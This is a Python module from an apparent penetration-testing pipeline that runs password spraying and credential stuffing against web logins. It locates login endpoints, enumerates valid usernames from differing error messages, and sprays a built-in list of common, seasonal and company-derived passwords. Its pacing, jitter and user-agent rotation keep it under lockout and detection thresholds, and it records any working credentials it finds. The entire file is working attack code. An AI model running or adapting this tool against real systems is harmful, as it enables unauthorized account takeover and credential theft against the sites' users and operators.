#!/usr/bin/env python3
# modules/step41_password_spray.py — Password Spray + Credential Stuffing
# NEW MODULE — Cycle 9
# Source: CEH v13 Practical Lab Ch11 + Coding for Pentester
# Smart spray: low-lockout-risk patterns, user enumeration first
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, json, time, urllib.request, urllib.error, urllib.parse
from core.utils import safe_read

# ── Password spray wordlists (CEH v13 lab + Coding for Pentester) ─────────────
SPRAY_PASSWORDS = [
    # Season + Year (most common pattern per Verizon DBIR)
    "Spring2024!", "Summer2024!", "Fall2024!", "Winter2024!",
    "Spring2025!", "Summer2025!", "Fall2025!", "Winter2025!",
    # Company name patterns (filled from target domain)
    "{company}123", "{company}2024", "{company}!", "{company}@123",
    "{Company}123!", "{COMPANY}123",
    # Generic common passwords
    "Password1", "Password1!", "P@ssword1", "Welcome1",
    "Welcome1!", "Passw0rd", "Passw0rd!", "Admin123!",
    "Admin@123", "Letmein1!", "Qwerty123!", "123456Aa!",
    "Monday123!", "January1!", "February1!", "March1!",
    # Default service passwords
    "admin", "password", "123456", "Admin@1234", "root",
    "toor", "administrator", "changeme", "default", "guest",
]

# ── User enumeration indicators ────────────────────────────────────────────────
USER_EXISTS_INDICATORS = [
    re.compile(r'"user_exists"\s*:\s*true',           re.I),
    re.compile(r'"exists"\s*:\s*true',                re.I),
    re.compile(r'incorrect password',                  re.I),
    re.compile(r'wrong password',                      re.I),
    re.compile(r'invalid password',                    re.I),
    re.compile(r'password.*(?:incorrect|wrong|invalid)',re.I),
]
USER_NOT_EXISTS_INDICATORS = [
    re.compile(r'"user_exists"\s*:\s*false',           re.I),
    re.compile(r'user.*not found',                     re.I),
    re.compile(r'no account.*found',                   re.I),
    re.compile(r'email.*not registered',               re.I),
    re.compile(r'account.*does not exist',             re.I),
]

# ── Login success indicators ───────────────────────────────────────────────────
LOGIN_SUCCESS = [
    re.compile(r'"token"\s*:\s*"[A-Za-z0-9._\-]{20,}"', re.I),
    re.compile(r'"access_token"\s*:\s*"',                re.I),
    re.compile(r'"session"\s*:\s*"',                     re.I),
    re.compile(r'location.*dashboard',                    re.I),
    re.compile(r'"success"\s*:\s*true',                   re.I),
    re.compile(r'"authenticated"\s*:\s*true',             re.I),
]

# ── Rate limit / lockout detection ─────────────────────────────────────────────
LOCKOUT_INDICATORS = [
    re.compile(r'too many.*attempts',                    re.I),
    re.compile(r'account.*locked',                       re.I),
    re.compile(r'temporarily.*blocked',                  re.I),
    re.compile(r'rate.*limit',                           re.I),
    re.compile(r'too many requests',                     re.I),
]

# Common login endpoint detection
LOGIN_PATHS = [
    "/api/login", "/api/auth", "/api/auth/login", "/login",
    "/signin", "/auth/signin", "/api/signin", "/auth",
    "/api/v1/login", "/api/v2/login", "/account/login",
    "/api/user/login", "/api/authenticate",
]

# Common username fields
USERNAME_FIELDS = ["username","email","login","user","identifier",
                   "email_address","user_email","account"]
PASSWORD_FIELDS = ["password","passwd","pass","pwd","secret","pin"]


class Step41PasswordSpray:
    """
    Smart Password Spray engine.
    CEH v13 + Coding for Pentester methodology:
    1. Discover login endpoint + detect form fields
    2. Enumerate valid users (if endpoint leaks existence)
    3. Spray 1-2 passwords per user (avoid lockout)
    4. Detect success / lockout / rate limit
    5. Test account lockout threshold
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("spray_results",
                             f"{p.out}/{p.prefix}_password_spray.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("PasswordSpray: no live hosts"); return

        # Extract company name from domain
        domain  = p.target.replace("https://","").replace("http://","").split("/")[0]
        company = domain.split(".")[0].capitalize()
        bare    = domain.split(".")[0].lower()

        auth_h = self._build_auth(p)
        p.log.info(f"Password Spray V7: {len(live)} hosts — enum + spray + lockout check")

        for host in live[:5]:
            host = host.rstrip("/")

            # Phase 1: Discover login endpoint
            login_ep = self._find_login_endpoint(host, auth_h)
            if not login_ep:
                continue
            p.log.info(f"  Login endpoint: {login_ep['url']}")

            # Phase 2: User enumeration
            valid_users = self._enumerate_users(login_ep, host)
            if valid_users:
                p.log.info(f"  Valid users found: {len(valid_users)}")
                for user in valid_users[:3]:
                    detail = (f"User Enumeration: '{user}' exists "
                              f"(response differs for valid vs invalid user)")
                    self._save(out,"medium","USER_ENUMERATION",
                               login_ep["url"],detail)
                    found += 1

            # Phase 3: Password spray (smart — 1 pass per user)
            passwords = self._build_spray_list(company, bare)
            r = self._spray(login_ep, valid_users or ["admin@"+domain,
                            "administrator","admin","user@"+domain],
                            passwords, out)
            found += r

            # Phase 4: Lockout threshold check
            r = self._check_lockout(login_ep, out)
            found += r

            p.bypass.jitter()

        p.log.success(f"Password Spray V7: {found} findings")

    # ── Phase 1: Find login endpoint ──────────────────────────────────────────
    def _find_login_endpoint(self, host: str, auth_h: dict) -> dict:
        for path in LOGIN_PATHS:
            url  = host + path
            resp = self._probe(url)
            if not resp or resp.get("status",0) == 404:
                continue
            body = resp.get("body","")
            st   = resp.get("status",0)

            if st in (200, 405, 422):
                # Detect field names from response
                user_field = "username"
                pass_field = "password"
                for f in USERNAME_FIELDS:
                    if f in body.lower():
                        user_field = f; break
                for f in PASSWORD_FIELDS:
                    if f in body.lower():
                        pass_field = f; break
                return {"url": url, "user_field": user_field,
                        "pass_field": pass_field, "method": "POST"}
        return None

    # ── Phase 2: User enumeration ─────────────────────────────────────────────
    def _enumerate_users(self, ep: dict, host: str) -> list:
        """
        CEH v13: Test if error messages reveal user existence.
        Different response for valid vs invalid user = user enumeration.
        """
        valid = []
        test_users = [
            "admin", "administrator", "test", "user",
            "support", "info", "noreply",
        ]
        domain = host.replace("https://","").replace("http://","").split("/")[0]
        test_users += [f"{u}@{domain}" for u in test_users[:3]]

        # Get baseline with fake user
        fake_resp = self._post_login(ep, "m7fake9x8@notreal.xyz", "FakePass123!")
        if not fake_resp: return []
        fake_body = fake_resp.get("body","")
        fake_st   = fake_resp.get("status",0)

        for user in test_users[:10]:
            resp = self._post_login(ep, user, "FakePassword999!")
            if not resp: continue
            body = resp.get("body","")
            st   = resp.get("status",0)

            # Different response = user exists
            body_diff = abs(len(body) - len(fake_body)) > 30
            st_diff   = st != fake_st

            exists_hint = any(p.search(body) for p in USER_EXISTS_INDICATORS)
            not_exists  = any(p.search(body) for p in USER_NOT_EXISTS_INDICATORS)

            if (exists_hint or (body_diff and not not_exists)) and not not_exists:
                valid.append(user)

            time.sleep(0.5)  # Gentle pace to avoid lockout

        return valid

    # ── Phase 3: Smart password spray ────────────────────────────────────────
    def _spray(self, ep: dict, users: list, passwords: list, out: str) -> int:
        """
        One password per user per round to stay under lockout threshold.
        """
        found = 0
        for password in passwords[:3]:  # Max 3 passwords to stay safe
            for user in users[:10]:
                resp = self._post_login(ep, user, password)
                if not resp: continue

                body = resp.get("body","")
                st   = resp.get("status",0)

                # Check lockout
                if any(p.search(body) for p in LOCKOUT_INDICATORS) or st == 429:
                    self.p.log.warn(f"  Rate limit / lockout triggered for {user}")
                    detail = (f"Account lockout / rate limit triggered: "
                              f"user='{user}' after spray")
                    self._save(out,"medium","SPRAY_LOCKOUT",ep["url"],detail)
                    return found  # Stop spray

                # Check success
                if any(p.search(body) for p in LOGIN_SUCCESS) or st == 200:
                    if "token" in body or "dashboard" in body.lower():
                        detail = (f"Credentials found: {user}:{password}")
                        self._save(out,"critical","CREDENTIALS_FOUND",
                                   ep["url"],detail)
                        found += 1

                time.sleep(1.5)  # Stay under lockout threshold
        return found

    # ── Phase 4: Lockout threshold ────────────────────────────────────────────
    def _check_lockout(self, ep: dict, out: str) -> int:
        """Test how many attempts before lockout. No lockout = brute-forceable."""
        attempts = 0
        for i in range(12):
            resp = self._post_login(ep, "lockout_test_user@test.com",
                                    f"WrongPass{i}!")
            if not resp: break
            body = resp.get("body","")
            st   = resp.get("status",0)

            if any(p.search(body) for p in LOCKOUT_INDICATORS) or st == 429:
                if attempts < 10:
                    detail = (f"Lockout after {attempts} attempts — "
                              f"low threshold may cause DoS on legit users")
                    self._save(out,"low","LOW_LOCKOUT_THRESHOLD",ep["url"],detail)
                return 0

            attempts += 1
            time.sleep(0.3)

        if attempts >= 10:
            detail = (f"No lockout after {attempts} attempts — "
                      f"brute force / password spray undetected")
            self._save(out,"high","NO_LOCKOUT",ep["url"],detail)
            return 1
        return 0

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_spray_list(self, company: str, bare: str) -> list:
        passwords = []
        for p in SPRAY_PASSWORDS:
            passwords.append(p.replace("{company}",bare)
                              .replace("{Company}",company)
                              .replace("{COMPANY}",bare.upper()))
        return list(dict.fromkeys(passwords))[:20]

    def _post_login(self, ep: dict, user: str, password: str) -> dict:
        url  = ep["url"]
        data = {ep["user_field"]: user, ep["pass_field"]: password}
        try:
            body_enc = json.dumps(data).encode()
            hdrs     = {"Content-Type":"application/json",
                        "User-Agent":  self.p.bypass.ua()}
            req      = urllib.request.Request(url, data=body_enc,
                                              headers=hdrs, method="POST")
            resp     = urllib.request.urlopen(req, timeout=8)
            return {"status": resp.status,
                    "body":   resp.read(10000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _probe(self, url: str) -> dict:
        try:
            req  = urllib.request.Request(
                url, headers={"User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=6)
            return {"status": resp.status,
                    "body":   resp.read(5000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None

    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        if c: hdrs["Cookie"] = c
        return hdrs

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "spray-v7", response=response, payload=payload)
